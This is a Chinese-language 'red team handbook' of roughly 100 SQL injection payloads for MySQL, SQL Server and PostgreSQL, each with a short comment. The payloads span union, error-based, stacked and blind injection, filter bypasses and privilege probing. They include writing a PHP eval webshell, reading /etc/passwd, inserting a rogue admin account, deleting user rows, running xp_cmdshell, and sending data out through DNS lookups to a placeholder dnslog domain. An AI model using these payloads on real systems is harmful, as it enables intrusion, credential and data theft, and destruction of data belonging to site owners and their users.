# 【红队渗透手册】100个sql注入Payload，（非常全，无任何废话版）



## **一、联合查询注入 Payload（6 个）**

#### **字段数量探测**

```
1" order by 1--+ //字段数量探测，从1开始递增测试临界值

1" order by 100--+ //测试字段数上限，出现错误即达临界值
```

#### **联合数据读取（假设字段数为 3）**

```
-1" union select 1,2,3--+ //用-1让原始查询无结果，便于展示联合查询数据
```

#### **数据库信息获取**

```
-1" union select 1,database(),3--+ //读取当前数据库名称（回显位假设为2）

-1" union select 1,version(),3 from information_schema.tables--+ //获取数据库版本信息
```

#### **数据枚举**

```
-1" union select 1,group_concat(col1,0x3a,col2),3 from dbName.tableName--+ //读取指定列数据，0x3a为分隔符
```

#### **适配特殊引号 / 过滤场景**

```
1%df' union select 1,database(),3--+ //宽字节注入（GBK编码场景），%df与'拼接逃逸单引号过滤

1 union select 1,version(),3--+ //无引号注入场景（参数未加引号包裹）

1' union/**/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x64767761--+ //表名用16进制编码绕过字符串过滤（0x64767761=dvwa）

1" union select NULL,NULL,concat(col1,0x20,col2) from dbName.tableName--+ //用NULL填充不确定字段类型的列

1' UNIOn SEleCT 1,current_user(),3--+ //大小写混合绕过union/select关键字过滤
```

## **二、报错注入 Payload（14 个）**

#### **1. extractvalue 函数注入（5 个）**

```
// 适配空格与等号被过滤场景

1" or extractvalue(1,concat(0x3a,(select database())))--+ //报错泄露当前库名

1" or extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema like 'dbName')))--+ //枚举指定库表名

1" or extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name like 'tableName')))--+ //枚举指定表列名

1" or extractvalue(1,concat(0x7e,(select left(colName,30) from dbName.tableName)))--+ //读取字段前30位字符

1" or extractvalue(1,concat(0x7e,(select right(colName,30) from dbName.tableName)))--+ //读取字段后30位字符
```

#### **2. updatexml 函数注入（4 个）**

```
1' or updatexml(1,concat(0x7e,database(),0x7e),1)-- //报错泄露数据库名

1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='dbName' limit 1,1),0x7e),1)-- //读取第2个表名

1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='dbName' and table_name='tableName' limit 1,1),0x7e),1)-- //读取第2个列名

1' or updatexml(1,concat(0x7e,(select concat(uname,0x3a,pwd) from users limit 1,1),0x7e),1)-- //读取第2条用户数据
```

#### **3. BigInt 类型溢出注入（4 个）**

```
// 利用 exp () 函数溢出触发报错

1' and exp(~(select * from (select current_user())tmp))-- //泄露当前数据库用户

1' and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 2,1)tmp))-- //读取第3个表名

1' and exp(~(select * from (select column_name from information_schema.columns where table_name='tableName' limit 2,1)tmp))-- //读取第3个列名

1' and exp(~(select * from (select colName from tableName limit 2,1)tmp))-- //读取第3条字段数据
```

#### **4. floor 函数注入（1 个）**

```
1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.columns group by x)tmp)-- //利用group by重复值报错
```

#### **5. MySQL 特殊函数报错**

```
1' and name_const((select database()),1)--+ //利用name_const函数重复命名报错，泄露库名

1' and geometrycollection((select * from (select database())a))--+ //空间函数报错，适配extractvalue/updatexml被过滤场景

1' and multipoint((select concat(table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1))--+ //空间函数泄露表名

1' and polygon((select concat(column_name,0x7e) from information_schema.columns where table_name='users' limit 0,1))--+ //空间函数泄露列名

1' and linestring((select concat(uname,0x3a,pwd) from users limit 0,1))--+ //空间函数泄露字段数据

1' and multilinestring((select version()))--+ //空间函数泄露数据库版本
```

#### **6. 跨数据库报错**

```
1' and convert(int,(select db_name()))--+ //SQL Server专属：convert类型转换报错，泄露当前库名

1' and (select cast((select table_name from information_schema.tables limit 0,1) as int))--+ //PostgreSQL/MySQL通用：cast类型转换报错
```

## **三、堆叠注入 Payload（5 个）**

#### **基础信息查询**

```
1"; show databases;-- //枚举所有数据库实例
1"; show tables from dbName;-- //指定数据库查表名
1"; show columns from tableName;-- //查看表结构（表名含特殊字符时需反引号）
```

#### **表结构操作**

```
1"; RENAME TABLE t1TOt2; RENAME TABLE t3TOt1; ALTER TABLE t1CHANGEc1 c2 VARCHAR(200); show columns from t1;-- //表名替换与列名修改
```

#### **数据读取（select 被禁时）**

```
1"; HANDLER tableNameOPEN; HANDLERtableNameREAD NEXT; HANDLERtableName CLOSE;-- //逐行读取表数据
```

#### **文件操作场景**

```
1"; select '<?php @eval($_POST[cmd]);?>' into outfile '/var/www/html/shell.php';--+ //MySQL写webshell（需secure_file_priv未限制）

1"; load_file('/etc/passwd');--+ //MySQL读取系统文件（需权限允许）

1'; copy (select '<?php phpinfo();?>') to '/var/www/shell.php';--+ //PostgreSQL写文件
```

#### **数据 / 结构修改场景**

```
1"; insert into users(uname,pwd) values('hacker','123456');--+ //堆叠插入管理员账号
1"; delete from users where uname='admin';--+ //堆叠删除指定数据（高危）
1"; create table hack_table(id int,cmd varchar(100));--+ //堆叠创建恶意表
```

#### **SQL Server 专属堆叠**

```
1'; exec xp_cmdshell('whoami');--+ //SQL Server执行系统命令（需开启xp_cmdshell）
```

## **四、盲注 Payload（30 个）**

#### **1. 布尔盲注基础（5 个）**

```
id=1" AND (SELECT COUNT(*) FROM users) > 0-- //验证users表是否存在

id=1" AND SUBSTR((SELECT version()),1,1) = '8'-- //判断数据库版本首位

id=1" AND ASCII(SUBSTR((SELECT pwd FROM users WHERE uname='admin'),1,1)) = 104-- //验证密码首字符ASCII值

id=1" AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test') > 5-- //判断test库表数量

id=1" AND LENGTH((SELECT database())) = 8-- //探测当前数据库名称长度
```

#### **2. 时间盲注基础（5 个）**

```
id=1"; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(3), NULL)-- //存在users表则延迟3秒

id=1"; IF((SELECT ASCII(SUBSTR((SELECT pwd FROM users WHERE uname='admin'),1,1))) = 104, BENCHMARK(8000000, MD5('x')), NULL)-- //密码首字符验证

id=1"; IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='test' AND table_name='users'), BENCHMARK(6000000, SHA1('x')), NULL)-- //验证users表存在性

id=1"; IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') = 4, SLEEP(3), NULL)-- //判断users表列数

id=1"; IF((SELECT SUM(LENGTH(uname)) FROM users) > 30, BENCHMARK(4000000, MD5('x')), NULL)-- //判断用户名总长度
```

#### **3. 错误型盲注（5 个）**

```
id=1" UNION SELECT 1,table_name,3 FROM information_schema.tables where table_schema='test'-- //枚举test库表名

id=1" UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- //枚举users表列名

id=1" UNION SELECT uname,pwd,3 FROM users where uname='admin'-- //读取admin用户数据

id=1'; SELECT uname,pwd FROM users WHERE role='admin' -- //堆叠查询读管理员数据

id=1'; SELECT group_concat(col1,col2) FROM test.table1 -- //读取指定表字段拼接值
```

#### **4. 布尔盲注进阶（15 个）**

```
// 数据库信息探测

1' and length(database()) < 15 # //判断当前库名长度是否小于15

1'and ascii(substr(database(),2,1)) > 95# //探测库名第2个字符ASCII值

// 表信息探测

1' and (select count(table_name) from information_schema.tables where table_schema=database()) = 8# //判断表数量是否为8

1'and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 12# //探测第1个表名长度

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)) < 110 # //探测第1个表名第3个字符

1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)) = 117# //探测第2个表名第1个字符

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1)) > 105 # //探测第2个表名第2个字符

// 列信息探测

1'and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') = 5# //判断users表列数

1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1)) = 8 # //探测第1个列名长度

1'and length(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1)) > 6# //探测第2个列名长度

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)) = 117 # //探测第1个列名第1个字符

1'and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)) = 112# //探测第2个列名第1个字符

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 2,1),2,1)) > 100 # //探测第3个列名第2个字符

// 字段数据探测

1'and length(substr((select uname from users limit 0,1),1)) = 6# //探测第1个用户名长度

1' and ascii(substr((select uname from users limit 0,1),2,1)) = 109 # //探测第1个用户名第2个字符
```

#### **5. 时间盲注进阶（5 个）**

```
1' and if(length(database())=8,sleep(3),1) # //库名长度为8则延迟3秒

1' and if(ascii(substr(database(),1,1))=116,sleep(3),1)# //库名首字符为't'则延迟

1' and if((select count(table_name) from information_schema.tables where table_schema=database())=5,sleep(3),1) # //表数量为5则延迟

1' and (select ascii(substr(table_name,2,1)) from information_schema.tables where table_schema='test' limit 0,1) = 101 and sleep(3)# //表名第2个字符为'e'则延迟

1' and if((select ascii(substr(column_name,1,1)) from information_schema.columns where table_name='users' limit 0,1)=117,sleep(3),1) # //列名首字符为'u'则延迟
```

#### **6、布尔盲注新函数**

```
1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^u'# //用regexp判断表名前缀（替代substr+ascii）

1' and (select column_name from information_schema.columns where table_name='users' limit 0,1) like 'pa%'# //用like模糊匹配列名

1' and bit_length(database())=32# //用bit_length判断库名字节数（1字符=8bit）
```

#### **7、时间盲注跨数据库**

```
1'; WAITFOR DELAY '0:0:5'-- //SQL Server专属时间盲注（延迟5秒）

1' and pg_sleep(5)--+ //PostgreSQL专属时间盲注函数

1' and if((select uname from users limit 0,1)='admin',sleep(5),0)# //多条件嵌套时间盲注
```

#### **8、DNSlog 盲注（无回显场景 4 个）**

```
// 需提前准备 DNSlog 域名（如xxx.dnslog.cn）

1' and load_file(concat('\\\\',(select database()),'.xxx.dnslog.cn\\a'))--+ //MySQL DNSlog泄露库名（Windows环境）

1' and (select load_file(concat('\\\\',hex((select table_name from information_schema.tables limit 0,1)),'.xxx.dnslog.cn\\b')))--+ //16进制编码避免特殊字符干扰

1'; exec master..xp_dirtree '\\\\(select db_name()).xxx.dnslog.cn\\c';-- //SQL Server DNSlog泄露库名

1' and (select pg_read_file(concat('\\\\',(select current_database()),'.xxx.dnslog.cn\\d')))--+ //PostgreSQL DNSlog
```

## **五、特殊场景注入（5 个）**

#### **1. 二次注入（注册 - 登录触发）**

```
注册用户名：admin'# 登录时触发：1' and uname='admin'#--+ //注册时注入恶意字符，登录时拼接执行
```

#### **2. 过滤绕过注入（空格 / 关键字被禁）**

```
1'%0aand%0a(ascii(substr(database(),1,1)))=100%0a# //用%0a（换行符）替代空格

1'and(select*from(select sleep(5))a)# //用子查询包裹sleep绕过函数过滤

1'and(select count(*)from information_schema.tables where table_schema=database()and table_name regexp '^u')>0# //嵌套子查询绕过括号过滤
```

#### **3. PostgreSQL 专属注入**

```
1' union select 1,(select current_database()),3--+ //PostgreSQL获取当前库名（替代database()）

1' and (select 1 from pg_tables where tablename like 'user%')--+ //PostgreSQL查询系统表pg_tables（替代information_schema）
```

#### **4. 无列名注入（information_schema 被禁）**

```
1' union select 1,(select * from (select * from users as a join users as b on a.id=b.id)c limit 0,1),3--+ //利用表自连接获取无列名数据
```

## **六、宽字节 / 编码绕过注入（5 个）**

```
1%e5' union select 1,version(),3--+ //UTF-8宽字节注入（%e5与'拼接逃逸）

1' and unhex('6461746162617365')=database()# //用unhex解码16进制字符串（6461746162617365=database）

1' union select 1,from_base64('ZGF0YWJhc2U='),3--+ //base64解码绕过字符串过滤（ZGF0YWJhc2U=database）

1" and char(100)=substr(database(),1,1)--+ //用char()函数构造字符（100='d'）

1' and concat_ws(',',col1,col2) regexp 'admin'# //用concat_ws拼接字段判断数据存在性
```

## **七、权限 / 配置探测注入（5 个）**

```
1' and (select super_priv from mysql.user where user=current_user())='Y'# //判断当前用户是否为超级管理员

1' union select 1,@@datadir,3--+ //查询MySQL数据存储目录

1' union select 1,@@secure_file_priv,3--+ //查询MySQL文件读写限制（为空则允许任意路径）

1'; select @@version_compile_os;-- //查询数据库服务器操作系统

1' and (select count(*) from mysql.user)>=5# //判断数据库用户数量
```



